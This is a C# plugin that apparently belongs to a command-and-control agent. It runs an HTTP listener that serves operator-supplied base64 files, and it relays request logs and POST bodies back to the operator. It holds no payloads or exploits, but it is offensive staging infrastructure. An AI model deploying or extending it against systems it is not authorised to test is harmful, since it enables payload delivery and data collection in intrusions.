using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using http_server;
using System.Net;
using Agent.Utilities;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Collections.Concurrent;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "http-server";
        private IMessageManager messageManager { get; set; }
        private readonly ConcurrentDictionary<string, byte[]> availableFiles = new(StringComparer.Ordinal);
        private const int MaximumRequestBodyBytes = 1024 * 1024;
        private readonly object lifecycleLock = new();
        private readonly Func<IHttpServerListener> listenerFactory;
        private ServerSession? activeSession;

        private sealed class ServerSession
        {
            public ServerSession(string taskId, CancellationTokenSource cancellation, IHttpServerListener listener)
            {
                TaskId = taskId;
                Cancellation = cancellation;
                Listener = listener;
            }

            public string TaskId { get; }
            public CancellationTokenSource Cancellation { get; }
            public IHttpServerListener Listener { get; }
            public bool StopRequested { get; set; }
            public object RequestsLock { get; } = new();
            public HashSet<Task> Requests { get; } = new();
        }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
            : this(messageManager, config, logger, tokenManager, spawner, pythonManager, () => new SystemHttpServerListener())
        {
        }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager, Func<IHttpServerListener> listenerFactory)
        {
            this.messageManager = messageManager;
            this.listenerFactory = listenerFactory;

        }

        public async Task Execute(ServerJob job)
        {
            HttpServerArgs args = JsonSerializer.Deserialize<HttpServerArgs>(job.task.parameters);
            if(args is null || !args.Validate()){
                messageManager.WriteLine("Failed to validate params", job.task.id, true);
                return;
            }


            switch (args.action.ToLower())
            {
                case "start":
                    await Start(args.port, job.cancellationtokensource, job.task.id, false); 
                    break;
                case "host":
                    await AddFile(args.fileName, args.fileContents, job.task.id);
                    break;
                case "stop":
                    await Stop(job.task.id);
                    break;
                case "list":
                    StringBuilder sb = new StringBuilder();
                    foreach(var file in availableFiles)
                    {
                        sb.AppendLine(file.Key);
                    }
                    messageManager.WriteLine(sb.ToString(), job.task.id, true);
                    break;
                default:
                    break;
            }
        }
        private async Task Start(int port, CancellationTokenSource cts, string taskId, bool ssl)
        {
            ServerSession session;
            lock (lifecycleLock)
            {
                if (activeSession is not null)
                {
                    messageManager.WriteLine("Server is already running.", taskId, true, "error");
                    return;
                }

                IHttpServerListener listener = listenerFactory();
                try
                {
                    listener.Start(port, ssl);
                }
                catch (Exception ex)
                {
                    listener.Dispose();
                    messageManager.WriteLine(ex.ToString(), taskId, true, "error");
                    return;
                }

                availableFiles.Clear();
                session = new ServerSession(taskId, cts, listener);
                activeSession = session;
            }

            using CancellationTokenRegistration stopRegistration = cts.Token.Register(() => StopListener(session.Listener));
            try
            {
                messageManager.WriteLine("Started on port " + port, taskId, false);

                while (!cts.IsCancellationRequested)
                {
                    try
                    {
                        HttpListenerContext context = await session.Listener.GetContextAsync();
                        Task request = HandleRequestAsync(context, session.TaskId);
                        lock (session.RequestsLock) session.Requests.Add(request);
                        _ = request.ContinueWith(completed =>
                        {
                            _ = completed.Exception;
                            lock (session.RequestsLock) session.Requests.Remove(completed);
                        }, CancellationToken.None, TaskContinuationOptions.ExecuteSynchronously, TaskScheduler.Default);
                    }
                    catch (ObjectDisposedException)
                    {
                        break;
                    }
                    catch (HttpListenerException) when (cts.IsCancellationRequested)
                    {
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                messageManager.WriteLine(ex.ToString(), taskId, true, "error");
            }
            finally
            {
                session.Listener.Dispose();
                Task[] requests;
                lock (session.RequestsLock) requests = session.Requests.ToArray();
                try { await Task.WhenAll(requests).ConfigureAwait(false); } catch { }
                lock (lifecycleLock)
                {
                    if (ReferenceEquals(activeSession, session))
                    {
                        activeSession = null;
                    }
                }
                messageManager.WriteLine("Server exit.", taskId, true);
            }
        }

        private static void StopListener(IHttpServerListener listener)
        {
            try
            {
                listener.Stop();
            }
            catch (ObjectDisposedException)
            {
            }
            catch (InvalidOperationException)
            {
            }
        }

        private async Task HandleRequestAsync(HttpListenerContext context, string taskId)
        {
            try
            {
                if (context?.Request?.Url is null) return;
                messageManager.WriteLine($"[{DateTime.Now}] Request for {context.Request.Url} from {context.Request.RemoteEndPoint}", taskId, false);
                string requestUrl = context.Request.Url.LocalPath.TrimStart('/');
                if (context.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
                {
                    if (context.Request.ContentLength64 > MaximumRequestBodyBytes)
                    {
                        context.Response.StatusCode = (int)HttpStatusCode.RequestEntityTooLarge;
                        return;
                    }
                    byte[] body = await HttpRequestBody.ReadAsync(context.Request.InputStream, MaximumRequestBodyBytes).ConfigureAwait(false);
                    if (body.Length > 0) messageManager.WriteLine(Encoding.UTF8.GetString(body), taskId, false);
                    context.Response.StatusCode = (int)HttpStatusCode.OK;
                    await context.Response.OutputStream.WriteAsync("{}"u8.ToArray()).ConfigureAwait(false);
                    return;
                }

                if (!availableFiles.TryGetValue(requestUrl, out byte[]? fileContent))
                    context.Response.StatusCode = (int)HttpStatusCode.NotFound;
                else
                {
                    context.Response.StatusCode = (int)HttpStatusCode.OK;
                    context.Response.ContentType = "application/octet-stream";
                    context.Response.ContentLength64 = fileContent.Length;
                    await context.Response.OutputStream.WriteAsync(fileContent).ConfigureAwait(false);
                }
            }
            catch (Exception ex)
            {
                messageManager.WriteLine(ex.ToString(), taskId, false, "error");
            }
            finally
            {
                context?.Response.Close();
            }
        }
        private async Task AddFile(string fileName, string fileContents, string task_id)
        {
            byte[] fileContent = Misc.Base64DecodeToByteArray(fileContents);
            availableFiles[fileName] = fileContent;
            messageManager.Write($"{fileName} available at /{fileName}", task_id, false);
        }
        private Task Stop(string task_id)
        {
            ServerSession session;
            lock (lifecycleLock)
            {
                if (activeSession is null)
                {
                    messageManager.WriteLine("No active server, is the server running?", task_id, true, "error");
                    return Task.CompletedTask;
                }

                session = activeSession;
                if (session.StopRequested)
                {
                    messageManager.WriteLine("Server is already stopping.", task_id, true);
                    return Task.CompletedTask;
                }
                session.StopRequested = true;
            }

            if (!messageManager.TryGetJob(session.TaskId, out ServerJob? job) || job is null)
            {
                messageManager.WriteLine("Couldn't find job.", task_id, true, "error");
            }

            session.Cancellation.Cancel();
            messageManager.WriteLine("Server tasked to exit.", task_id, true);
            return Task.CompletedTask;
        }
    }

    public static class HttpRequestBody
    {
        public static async Task<byte[]> ReadAsync(Stream input, int maximumBytes, CancellationToken token = default)
        {
            ArgumentOutOfRangeException.ThrowIfNegative(maximumBytes);
            using var output = new MemoryStream(Math.Min(maximumBytes, 81920));
            byte[] buffer = new byte[81920];
            while (true)
            {
                int remaining = maximumBytes + 1 - checked((int)output.Length);
                int read = await input.ReadAsync(buffer.AsMemory(0, Math.Min(buffer.Length, remaining)), token).ConfigureAwait(false);
                if (read == 0) return output.ToArray();
                output.Write(buffer, 0, read);
                if (output.Length > maximumBytes)
                    throw new InvalidDataException("HTTP request body exceeds the configured limit.");
            }
        }
    }
}